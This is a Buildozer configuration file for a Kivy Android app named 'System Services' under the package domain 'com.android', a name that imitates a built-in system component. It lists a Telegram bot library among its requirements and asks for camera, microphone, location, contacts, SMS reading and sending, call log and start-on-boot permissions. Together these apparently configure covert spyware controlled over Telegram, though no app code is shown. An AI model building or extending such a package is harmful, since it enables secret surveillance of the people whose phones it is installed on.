[app]

# Application title
title = System Services

# Package name
package.name = systemservices

# Package domain
package.domain = com.android

# Source directory
source.dir = .

# Source files to include
source.include_exts = py,png,jpg,kv,atlas,ttf,json,txt

# Application version
version = 1.0.0

# Requirements
requirements = python3,kivy==2.1.0,pytelegrambotapi,requests,plyer

# Orientation
orientation = portrait

# Fullscreen mode
fullscreen = 0

#
# Android specific
#

# Android permissions
android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,CAMERA,RECORD_AUDIO,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CONTACTS,READ_SMS,SEND_SMS,CALL_PHONE,READ_CALL_LOG,READ_PHONE_STATE,WAKE_LOCK,FOREGROUND_SERVICE,RECEIVE_BOOT_COMPLETED

# Android API level
android.api = 30

# Minimum API
android.minapi = 21

# Android NDK version
android.ndk = 23b

# Presplash color
android.presplash_color = #FFFFFF

# Icon (optional)
# icon.filename = %(source.dir)s/icon.png
